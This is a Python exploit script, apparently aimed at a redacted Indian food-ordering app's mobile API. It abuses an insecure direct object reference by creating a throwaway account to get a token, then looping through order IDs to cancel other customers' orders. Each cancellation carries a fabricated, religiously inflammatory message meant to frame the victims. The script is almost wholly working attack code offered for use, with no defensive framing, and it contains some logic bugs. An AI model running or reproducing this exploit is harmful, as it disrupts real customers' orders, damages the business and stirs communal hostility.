import requests
import urllib3
import time
import json
from random import randint

banner = ("##############################################################\n"
          "## NAMEREDACTED - INSECURE DIRECT OBJECT REFERENCE EXPLOIT  ##\n"
          "## This exploit will cancel orders for other users without  ##\n"
          "## consent, and also frame them with a fake cancel message  ##\n"  
          "##                        v 1.2                             ##\n"
          "##############################################################")
print(banner)

urllib3.disable_warnings()

exploit_start = 2463

print("\nWelcome Back Commander!\n")

def gen_token():
    global token
    cookies = {
        'PHPSESSID': '4db1764b024434611d9e366f88727d61',
        '_lang': 'en',
    }

    headers = {
        'Origin': 'file://',
        'X-Requested-With': 'NAMEREDACTED.mobile.app',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }

    data = {
        'next_step': 'show_home_page',
        'first_name': 'RANDOMNAME',
        'last_name': 'RANDOMNAME',
        'contact_phone': '+91'+str(randint(000000000, 999999999))+"",
        'password': 'PASSWORDREDACTED',
        'cpassword': 'PASSWORDREDACTED',
        'device_id': 'cBETg-7WuzYmZrbcJwKXJw:APA91bGBlYCdaxuye5PnzQHGBJIZV1vJ7pxOYgxJKFQDYNSGUJ72K0__QsBFXGeCLE5cZIFWLtQ0jXiHbpLZbEN09PFnMRVgogHSYVE8YOEG63ZrgcFLnKV1K589qvCA7XmCkdLx06H9',
        'device_platform': 'Android',
        'device_uiid': 'edffecf23b23df00',
        'code_version': '1.5.1',
        'user_token': '',
        'lang': 'en',
        'mc_currency': '',
        'lat': '9.154478360277789',
        'lng': '76.73339683417',
        'current_page': 'create_account'
    }

    response = requests.post('https://NAMEREDACTED.com:443/mobileappv2/api/createAccount', headers=headers, cookies=cookies,
                             data=data, verify=False)
    output = response.json()
    jsonData = json.dumps(output)
    resp = json.loads(jsonData)
    token = resp['details']['customer_token']
    print("[+] Token Generated: " + str(token))
    return token



attacktype = raw_input("[!] Commander, Would you like an Automated Attack or Manual? [A/M]: ")
if attacktype == "A" or "a":
    print("[+] Attempting to generate a valid user token")
    gen_token()
elif attacktype == "M" or "m":
    token = raw_input("Please provide your token: ")
else:
    print("[X] Your input is invalid, plrease restart the exploit and try again.")
    exit(0)

cookies = {
    'PHPSESSID': '4db1764b024434611d9e366f88727d61',
    '_lang': 'en',
}

headers = {
    'Origin': 'file://',
    'X-Requested-With': 'NAMEREDACTED.mobile.app',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
}

data = {
  'order_id': ""+str(exploit_start)+"",
  'cancel_reason': 'NAMEREDACTED called me , they said you eat cows but its holy so I canceled the order.',
  'device_id': 'cBETg-7WuzYmZrbcJwKXJw:APA91bGBlYCdaxuye5PnzQHGBJIZV1vJ7pxOYgxJKFQDYNSGUJ72K0__QsBFXGeCLE5cZIFWLtQ0jXiHbpLZbEN09PFnMRVgogHSYVE8YOEG63ZrgcFLnKV1K589qvCA7XmCkdLx06H9',
  'device_platform': 'Android',
  'device_uiid': 'edffecf23b23df00',
  'code_version': '1.5.1',
  'user_token': ""+str(token)+"",
  'lang': 'en',
  'mc_currency': '',
  'lat': '9.154478360277789',
  'lng': '76.73339683417',
  'current_page': 'cancel_order_form'
}


while exploit_start < 2600:
    if exploit_start > 2598:
        exploit_start = 2463
        response = requests.post('https://NAMEREDACTED.com:443/mobileappv2/api/CancelOrder', headers=headers, cookies=cookies,
                             data=data, verify=False)
        exploit_start = exploit_start + 1
        print("[+] Attempting to Cancel OrderID: " + str(exploit_start))
        print("[+] Response Code: " + str(response.status_code) + " , Msg: " + resp['msg'])
        time.sleep(0.5)
    else:
        response = requests.post('https://NAMEREDACTED.com:443/mobileappv2/api/CancelOrder', headers=headers, cookies=cookies,
                             data=data, verify=False)
        exploit_start = exploit_start + 1
        output = response.json()
        jsonData = json.dumps(output)
        resp = json.loads(jsonData)
        print("[+] Attempting to Cancel OrderID: " + str(exploit_start))
        print("[+] Response Code: " + str(response.status_code) + " , Msg: " + resp['msg'])
        time.sleep(0.5)
